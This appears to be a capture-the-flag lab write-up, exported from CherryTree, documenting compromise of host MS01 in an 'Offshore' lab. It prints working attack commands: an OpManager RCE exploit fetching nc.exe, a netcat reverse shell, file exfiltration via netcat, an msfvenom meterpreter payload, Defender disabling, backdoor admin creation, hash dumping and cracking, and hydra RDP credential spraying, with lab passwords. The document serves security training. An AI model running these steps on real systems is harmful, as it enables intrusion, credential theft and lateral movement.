<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MS01 - 172.16.1.30</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>MS01 - 172.16.1.30</h1><br/><p><a href="Offshore--MS01_-_172.16.1.30_5.html#OFS-Flag5">Flag 5</a></p><p><a href="Offshore--MS01_-_172.16.1.30_5.html#OFS-Flag6">Flag 6</a></p><p><a href="Offshore--MS01_-_172.16.1.30_5.html#OFS-Flag7">Flag 7</a></p><p><a href="Offshore--MS01_-_172.16.1.30_5.html#OFS-NedFlandersCreds">Credentials for 172.16.1.36 / WSADM</a></p><p></p><p>Nmap scan result</p><p></p><p><code><span style="background-color:#000000;">Nmap scan report for 10.10.110.124</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Host is up (0.024s latency).</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PORT     STATE    SERVICE  VERSION</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">22/tcp   filtered ssh</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">80/tcp   open     http     Microsoft IIS httpd 10.0</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">443/tcp  filtered https</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">8000/tcp filtered http-alt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">8089/tcp filtered unknown</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></code></p><p></p><p>Look around and there is a flag in the dashboard in the settings</p><p></p><p><a name="OFS-Flag5"></a><code><span style="background-color:#000000;">OFFSHORE{sm3lls_so_g00d}</span></code></p><p></p><p>The version is vulnerable to RCE</p><p><a href="https://www.exploit-db.com/exploits/47255">https://www.exploit-db.com/exploits/47255</a></p><p></p><p>Upload NC</p><p><code><span style="background-color:#000000;">└─$ python ms01exploit.py -u admin -p Zaq12wsx! -t http://172.16.1.30 -c &#39;powershell wget http://10.10.14.14/nc.exe -Outfile nc.exe&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Successfully created Workflow</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[!] Executing Code . . .</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Code appears to have run successfully!</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[!] Cleaning up . . .</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Exploit complete!</span></code><code></code></p><p><code></code></p><p>Execute it</p><p><code><span style="background-color:#000000;">└─$ python ms01exploit.py -u admin -p Zaq12wsx! -t http://172.16.1.30 -c &#39;nc.exe -e cmd.exe 10.10.15.154 4444&#39;                      </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Successfully created Workflow</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[!] Executing Code . . .</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Code appears to have run successfully!</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[!] Cleaning up . . .</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Exploit complete!</span></code></p><p></p><p>Catch the rev shell</p><p><code><span style="background-color:#000000;">└─$ nc -nlvp 4444       </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">listening on [any] 4444 ...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">connect to [10.10.15.154] from (UNKNOWN) [10.10.110.3] 65187</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Microsoft Windows [Version 10.0.14393]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">(c) 2016 Microsoft Corporation. All rights reserved.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">C:\ManageEngine_new\OpManager\logs&gt;whoami</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">whoami</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">nt authority\system</span></code></p><p></p><p>Get a list of all the files in every user directory</p><p><code><span style="background-color:#000000;">dir C:\users /s /b</span></code></p><p></p><p>Intersting ones</p><p><code><span style="background-color:#000000;">C:\users\Public\POST.ps1</span></code></p><p><code><span style="background-color:#000000;">C:\users\administrator.ADMIN.000\Documents\logins.xlsx</span></code></p><p></p><p>Snag the flag while we&#39;re here</p><p><code><span style="background-color:#000000;">C:\Users\Administrator\Desktop&gt;type flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">type flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag6"></a>OFFSHORE{RC3_a$_@_s3rv1c3}</p><p></p><p>Grab the logins.xlsx, get the hash with office2john and crack it</p><p></p><p><code><span style="background-color:#000000;">C:\ManageEngine_new\OpManager\logs&gt;nc.exe 10.10.15.154 777 &lt; C:\Users\administrator.ADMIN.000\Documents\logins.xlsx</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">nc.exe 10.10.15.154 777 &lt; C:\Users\administrator.ADMIN.000\Documents\logins.xlsx</span></code></p><p></p><p><code><span style="background-color:#000000;">\Downloads\hashcat-6.2.6&gt;hashcat -a 0 -m 9600 xlsx.hash rockyou.txt -w 3</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">hashcat (v6.2.6) starting</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">CUDA API (CUDA 12.1)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">====================</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">* Device #1: NVIDIA GeForce GTX 1060 3GB, 2474/3071 MB, 9MCU</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">OpenCL API (OpenCL 3.0 CUDA 12.1.98) - Platform #1 [NVIDIA Corporation]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">=======================================================================</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">* Device #2: NVIDIA GeForce GTX 1060 3GB, skipped</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Minimum password length supported by kernel: 0</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Maximum password length supported by kernel: 256</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Hashes: 1 digests; 1 unique digests, 1 unique salts</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Rules: 1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Optimizers applied:</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">* Zero-Byte</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">* Single-Hash</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">* Single-Salt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">* Slow-Hash-SIMD-LOOP</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">* Uses-64-Bit</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Watchdog: Temperature abort trigger set to 90c</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Host memory required for this attack: 281 MB</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Dictionary cache hit:</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">* Filename..: rockyou.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">* Passwords.: 14344384</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">* Bytes.....: 139921497</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">* Keyspace..: 14344384</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =&gt;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$office$*2013*100000*256*16*6e2731071c58ebe3183c5b977ca7b3b7*68b91538f0e2b5b7f6e5d2e81863d225*02f66339b247b3a301bb6c312922c10cb5ea92741dc11d2a13e98b0265aa6904:</span></code><strong><code><span style="background-color:#000000;">broken</span></code></strong><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Session..........: hashcat</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Status...........: Cracked</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Hash.Mode........: 9600 (MS Office 2013)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Hash.Target......: $office$*2013*100000*256*16*6e2731071c58ebe3183c5b9...aa6904</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Time.Started.....: Wed Apr 19 23:30:04 2023 (59 secs)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Time.Estimated...: Wed Apr 19 23:31:03 2023 (0 secs)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Kernel.Feature...: Pure Kernel</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Guess.Base.......: File (rockyou.txt)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Guess.Queue......: 1/1 (100.00%)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Speed.#1.........:     4409 H/s (76.05ms) @ Accel:256 Loops:128 Thr:1024 Vec:1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Progress.........: 262144/14344384 (1.83%)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Rejected.........: 0/262144 (0.00%)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Restore.Point....: 0/14344384 (0.00%)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Candidate.Engine.: Device Generator</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Candidates.#1....: 123456 -&gt; rebel91</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Hardware.Mon.#1..: Temp: 66c Fan:  0% Util:100% Core: 139MHz Mem:4006MHz Bus:16</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Started: Wed Apr 19 23:29:44 2023</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Stopped: Wed Apr 19 23:31:04 2023</span></code></p><p></p><p><img src="images/5-1.png" alt="images/5-1.png" /></p><p></p><p>On the second sheet in that Excel file we find our second flag for MS01</p><p><a name="OFS-Flag7"></a><code><span style="background-color:#000000;">OFFSHORE{p@ssw0rds_1n_cl3ar_t3xT}</span></code></p><p></p><p>Create local admin and add to administrators group</p><p><code><span style="background-color:#000000;">&gt;net user test password123! /add</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">net user test password123! /add</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">The command completed successfully.</span></code><strong><code><span style="background-color:#000000;"></span></code></strong></p><p><strong><code><span style="background-color:#000000;"></span></code></strong><strong><code><span style="background-color:#000000;"></span></code></strong></p><p><strong><code><span style="background-color:#000000;"></span></code></strong><strong><code><span style="background-color:#000000;"></span></code></strong></p><p><strong><code><span style="background-color:#000000;"></span></code></strong><code><span style="background-color:#000000;">c:\Windows\debug&gt;net localgroup administrators test /add</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">net localgroup administrators test /add</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">The command completed successfully.</span></code></p><p></p><p>RDP in and open Powershell and turn off Defender</p><p><code><span style="background-color:#000000;">Set-Mppreference -DisableRealTimeMonitoring $true</span></code></p><p></p><p>Generate Metasploit payload</p><p><code><span style="background-color:#000000;">└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.154 LPORT=3333 -f exe &gt; msfrev.exe</span></code></p><p></p><p>Do a hashdump</p><p><code><span style="background-color:#000000;">meterpreter &gt; hashdump</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">justalocaladmin:1001:aad3b435b51404eeaad3b435b51404ee:01c33f4a27c612833b20e31fd0129ad4:::</span></code></p><p></p><p>Crack Administrator password with rockyou.txt</p><p><code><span style="background-color:#000000;">7facdc498ed1680c4fd1448319a8c04f:Password1!</span></code></p><p></p><p>Lets see if we can RDP to any other host with the nedflanders account we found in the logins.xlsx</p><p></p><p><code><span style="background-color:#000000;">└─$ hydra -l ned.flanders_adm -p &#39;Lefthandedyeah!&#39; -M corp.ip_list.txt rdp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-20 00:18:48</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[WARNING] rdp servers often don&#39;t like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[DATA] max 1 task per 11 servers, overall 11 tasks, 1 login try (l:1/p:1), ~1 try per task</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[DATA] attacking rdp://(11 targets):3389/</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[3389][rdp] account on 172.16.1.23 might be valid but account not active for remote desktop: login: ned.flanders_adm password: Lefthandedyeah!, continuing attacking the account.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[3389][rdp] account on 172.16.1.201 might be valid but account not active for remote desktop: login: ned.flanders_adm password: Lefthandedyeah!, continuing attacking the account.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[3389][rdp] account on 172.16.1.220 might be valid but account not active for remote desktop: login: ned.flanders_adm password: Lefthandedyeah!, continuing attacking the account.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[ERROR] freerdp: The connection failed to establish.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[3389][rdp] account on 172.16.1.26 might be valid but account not active for remote desktop: login: ned.flanders_adm password: Lefthandedyeah!, continuing attacking the account.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[3389][rdp] account on 172.16.1.5 might be valid but account not active for remote desktop: login: ned.flanders_adm password: Lefthandedyeah!, continuing attacking the account.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[3389][rdp] account on 172.16.1.30 might be valid but account not active for remote desktop: login: ned.flanders_adm password: Lefthandedyeah!, continuing attacking the account.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[3389][rdp] account on 172.16.1.15 might be valid but account not active for remote desktop: login: ned.flanders_adm password: Lefthandedyeah!, continuing attacking the account.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[3389][rdp] account on 172.16.1.24 might be valid but account not active for remote desktop: login: ned.flanders_adm password: Lefthandedyeah!, continuing attacking the account.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[3389][rdp] host: 172.16.1.36   login: ned.flanders_adm   password: Lefthandedyeah!</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[ERROR] freerdp: The connection failed to establish.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[ERROR] all children were disabled due too many connection errors</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">10 of 11 targets successfully completed, 1 valid password found</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-20 00:18:50</span></code><strong><code><span style="background-color:#000000;"></span></code></strong></p><p><strong><code><span style="background-color:#000000;"></span></code></strong></p><p><a name="OFS-NedFlandersCreds"></a>It shows we can RDP to 172.16.1.36 with ned.flanders_adm / Lefthandedyeah!</p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
